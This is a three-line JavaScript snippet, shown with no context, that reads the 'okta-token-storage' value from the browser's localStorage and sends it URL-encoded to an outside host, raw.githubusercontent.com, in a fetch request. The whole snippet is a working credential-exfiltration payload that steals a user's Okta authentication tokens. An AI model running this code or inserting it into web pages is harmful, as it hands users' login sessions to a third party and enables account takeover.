fetch(`https://raw.githubusercontent.com/?oktaToken=${encodeURIComponent(localStorage.getItem('okta-token-storage'))}`, {
  method: 'GET',
});
